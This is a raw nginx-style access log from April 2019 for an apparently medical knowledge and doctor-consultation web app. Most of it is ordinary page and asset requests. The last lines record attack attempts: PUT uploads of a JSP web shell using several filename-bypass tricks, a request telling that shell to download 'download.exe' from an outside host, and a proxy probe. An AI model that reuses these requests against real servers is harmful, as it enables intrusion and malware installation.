120.199.34.98 - - [14/Apr/2019:15:40:23 +0800] "GET /static/layuiadmin/layui/lay/modules/tree.js HTTP/1.1" 200 3060 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:40:23 +0800] "GET /views/classifiedQuery/getFenlei HTTP/1.1" 301 0 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:40:24 +0800] "GET /views/classifiedQuery/getFenlei/ HTTP/1.1" 200 16525 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:40:24 +0800] "GET /static/layuiadmin/layui/css/modules/layer/default/loading-2.gif HTTP/1.1" 200 1787 "http://119.29.225.142/static/layuiadmin/layui/css/modules/layer/default/layer.css?v=3.1.1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:40:30 +0800] "POST /views/classifiedQuery/getEntity/ HTTP/1.1" 200 806215 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:40:42 +0800] "GET /views/classifiedQuery/ HTTP/1.1" 200 11624 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:40:43 +0800] "GET /views/classifiedQuery/getFenlei/ HTTP/1.1" 200 16525 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:40:49 +0800] "POST /views/classifiedQuery/getEntity/ HTTP/1.1" 200 806215 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:46:23 +0800] "GET /views/interlocution/ HTTP/1.1" 200 4095 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:47:26 +0800] "GET /views/classifiedQuery/ HTTP/1.1" 200 11624 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:47:26 +0800] "GET /views/classifiedQuery/getFenlei/ HTTP/1.1" 200 16525 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:47:32 +0800] "POST /views/classifiedQuery/getEntity/ HTTP/1.1" 200 806215 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:51:25 +0800] "GET /views/entityQuery/ HTTP/1.1" 200 10471 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:51:28 +0800] "GET /views/relationQuery/ HTTP/1.1" 200 7958 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:51:30 +0800] "GET /views/relationQuery/relation/ HTTP/1.1" 200 75 "http://119.29.225.142/views/relationQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:51:50 +0800] "GET /views/classifiedQuery/ HTTP/1.1" 200 11624 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:51:50 +0800] "GET /views/classifiedQuery/getFenlei/ HTTP/1.1" 200 16525 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:51:56 +0800] "POST /views/classifiedQuery/getEntity/ HTTP/1.1" 200 806215 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:53:23 +0800] "GET /views/distinguish/ HTTP/1.1" 200 4075 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:54:31 +0800] "GET /views/interlocution/ HTTP/1.1" 200 4095 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:56:56 +0800] "GET /views/consoles/ HTTP/1.1" 200 9446 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:27 +0800] "GET /accounts/login HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:27 +0800] "GET /accounts/login/ HTTP/1.1" 200 5358 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:27 +0800] "GET /static/users/js/layui.js HTTP/1.1" 200 9722 "http://119.29.225.142/accounts/login/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:27 +0800] "GET /static/users/css/admin.css HTTP/1.1" 200 1905 "http://119.29.225.142/accounts/login/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:27 +0800] "GET /static/users/css/layui.css HTTP/1.1" 200 78313 "http://119.29.225.142/accounts/login/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:28 +0800] "GET /static/users/js/lay/modules/layer.js HTTP/1.1" 200 32221 "http://119.29.225.142/accounts/login/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:28 +0800] "GET /static/users/font/iconfont.woff?v=230 HTTP/1.1" 200 26328 "http://119.29.225.142/static/users/css/layui.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:28 +0800] "GET /static/users/js/css/modules/layer/default/layer.css?v=3.1.1 HTTP/1.1" 200 18685 "http://119.29.225.142/accounts/login/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:30 +0800] "GET /static/users/js/lay/modules/jquery.js HTTP/1.1" 200 147362 "http://119.29.225.142/accounts/login/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:31 +0800] "GET /static/images/background.jpg HTTP/1.1" 200 276020 "http://119.29.225.142/static/users/css/admin.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:31 +0800] "GET /accounts/login/code.jpg HTTP/1.1" 404 1121 "http://119.29.225.142/accounts/login/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:59:51 +0800] "GET /static/favicon.ico HTTP/1.1" 200 4286 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:06 +0800] "GET /views/consoles/ HTTP/1.1" 200 14277 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:10 +0800] "GET /accounts/register HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:10 +0800] "GET /accounts/register/ HTTP/1.1" 200 3939 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:13 +0800] "GET /static/favicon.ico HTTP/1.1" 200 4286 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:15 +0800] "GET /doctor/register1 HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:15 +0800] "GET /doctor/register1/ HTTP/1.1" 200 4154 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:16 +0800] "GET /static/images/background1.jpg HTTP/1.1" 200 58960 "http://119.29.225.142/static/users/css/admin.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:16 +0800] "GET /static/users/js/lay/modules/form.js HTTP/1.1" 200 15338 "http://119.29.225.142/doctor/register1/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
42.236.10.75 - - [14/Apr/2019:16:00:21 +0800] "GET /doctor/register1/ HTTP/1.1" 200 4154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
101.89.239.230 - - [14/Apr/2019:16:00:27 +0800] "GET /accounts/login HTTP/1.1" 301 0 "22F93510D2EF14BE50120.199.34.98" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400"
42.236.10.75 - - [14/Apr/2019:16:00:28 +0800] "GET /static/users/css/layui.css HTTP/1.1" 200 78313 "http://119.29.225.142/doctor/register1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
42.236.10.93 - - [14/Apr/2019:16:00:29 +0800] "GET /static/users/css/admin.css HTTP/1.1" 200 1905 "http://119.29.225.142/doctor/register1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
42.236.10.84 - - [14/Apr/2019:16:00:29 +0800] "GET /static/users/js/layui.js HTTP/1.1" 200 9722 "http://119.29.225.142/doctor/register1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:16:00:33 +0800] "GET /static/favicon.ico HTTP/1.1" 200 4286 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
42.236.10.75 - - [14/Apr/2019:16:00:35 +0800] "GET /static/users/font/iconfont.woff?v=230 HTTP/1.1" 200 26328 "http://119.29.225.142/static/users/css/layui.css" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
42.236.10.93 - - [14/Apr/2019:16:00:35 +0800] "GET /static/users/js/lay/modules/layer.js HTTP/1.1" 200 32221 "http://119.29.225.142/doctor/register1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
42.236.10.78 - - [14/Apr/2019:16:00:37 +0800] "GET /static/images/background1.jpg HTTP/1.1" 200 58960 "http://119.29.225.142/static/users/css/admin.css" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:16:00:38 +0800] "GET /accounts/login/ HTTP/1.1" 200 5358 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
42.236.10.93 - - [14/Apr/2019:16:00:39 +0800] "GET /static/users/js/css/modules/layer/default/layer.css?v=3.1.1 HTTP/1.1" 200 18685 "http://119.29.225.142/doctor/register1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
42.236.10.93 - - [14/Apr/2019:16:00:40 +0800] "GET /static/users/js/lay/modules/jquery.js HTTP/1.1" 200 147362 "http://119.29.225.142/doctor/register1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
42.236.10.78 - - [14/Apr/2019:16:00:45 +0800] "GET /static/users/js/lay/modules/form.js HTTP/1.1" 200 15338 "http://119.29.225.142/doctor/register1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:16:00:54 +0800] "POST /accounts/login/ HTTP/1.1" 302 0 "http://119.29.225.142/accounts/login/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:54 +0800] "GET / HTTP/1.1" 200 12997 "http://119.29.225.142/accounts/login/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:54 +0800] "GET /static/favicon.ico HTTP/1.1" 200 4286 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:00:54 +0800] "GET /static/images/20190126181307_83.jpg HTTP/1.1" 200 55627 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:07 +0800] "GET /views/myDoctor?id=1 HTTP/1.1" 499 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
101.226.226.221 - - [14/Apr/2019:16:01:10 +0800] "GET /accounts/register HTTP/1.1" 301 0 "22F93510D2EF14BE50120.199.34.98" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400"
120.199.34.98 - - [14/Apr/2019:16:01:11 +0800] "GET /views/console/ HTTP/1.1" 200 13907 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:13 +0800] "GET /views/myDoctor?id=1 HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:14 +0800] "GET /views/myDoctor/?id=1 HTTP/1.1" 200 21015 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:14 +0800] "GET /static/layuiadmin/style/template.css HTTP/1.1" 200 12254 "http://119.29.225.142/views/myDoctor/?id=1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:15 +0800] "GET /static/images/doctorheader/20190327075308_55.jpg HTTP/1.1" 200 66738 "http://119.29.225.142/views/myDoctor/?id=1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.151.178.217 - - [14/Apr/2019:16:01:15 +0800] "GET /doctor/register1 HTTP/1.1" 301 0 "22F93510D2EF14BE50120.199.34.98" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400"
120.199.34.98 - - [14/Apr/2019:16:01:15 +0800] "GET /static/layuiadmin/modules/doctorim.js HTTP/1.1" 200 1752 "http://119.29.225.142/views/myDoctor/?id=1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:17 +0800] "GET /static/images/doctorheader/20190327132320_91.JPG HTTP/1.1" 200 178148 "http://119.29.225.142/views/myDoctor/?id=1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:17 +0800] "GET /static/images/doctorheader/20190327134521_63.JPG HTTP/1.1" 200 178654 "http://119.29.225.142/views/myDoctor/?id=1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:18 +0800] "GET /doctor/getDoctorAndPingjia?doctorId=YS19032701 HTTP/1.1" 301 0 "http://119.29.225.142/views/myDoctor/?id=1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:18 +0800] "GET /static/layuiadmin/layui/css/modules/layer/default/loading-1.gif HTTP/1.1" 200 701 "http://119.29.225.142/static/layuiadmin/layui/css/modules/layer/default/layer.css?v=3.1.1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:18 +0800] "GET /doctor/getDoctorAndPingjia/?doctorId=YS19032701 HTTP/1.1" 200 6903 "http://119.29.225.142/views/myDoctor/?id=1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:18 +0800] "GET /static/images/default.gif HTTP/1.1" 200 2162 "http://119.29.225.142/doctor/getDoctorAndPingjia/?doctorId=YS19032701" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:18 +0800] "GET /static/images/doctorheader/20190327122141_9.JPG HTTP/1.1" 200 252981 "http://119.29.225.142/views/myDoctor/?id=1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:01:19 +0800] "GET /static/layuiadmin/layui/lay/modules/rate.js HTTP/1.1" 200 2753 "http://119.29.225.142/doctor/getDoctorAndPingjia/?doctorId=YS19032701" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:03:06 +0800] "GET /views/interlocution?id=1 HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:03:06 +0800] "GET /views/interlocution/?id=1 HTTP/1.1" 200 4082 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:04:28 +0800] "GET /views/classifiedQuery/ HTTP/1.1" 200 11624 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:04:29 +0800] "GET /views/classifiedQuery/getFenlei/ HTTP/1.1" 200 16525 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:04:36 +0800] "POST /views/classifiedQuery/getEntity/ HTTP/1.1" 200 806215 "http://119.29.225.142/views/classifiedQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:05:24 +0800] "GET /views/distinguish/ HTTP/1.1" 200 4075 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:05:39 +0800] "GET /views/entityQuery/ HTTP/1.1" 200 10471 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:16:05:57 +0800] "GET /views/myDoctor/?id=1 HTTP/1.1" 200 21015 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
119.29.163.219 - - [14/Apr/2019:16:27:38 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 404 1121 "http://119.29.225.142:80/FxCodeShell.jsp%20" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
119.29.163.219 - - [14/Apr/2019:16:27:38 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 404 1121 "http://119.29.225.142:80/FxCodeShell.jsp::$DATA" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
119.29.163.219 - - [14/Apr/2019:16:27:38 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 404 1121 "http://119.29.225.142:80/FxCodeShell.jsp/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
119.29.163.219 - - [14/Apr/2019:16:27:38 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 1121 "http://119.29.225.142:80/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
121.130.145.204 - - [14/Apr/2019:16:46:05 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
80.82.70.187 - - [14/Apr/2019:16:57:58 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1121 "-" "Mozilla"
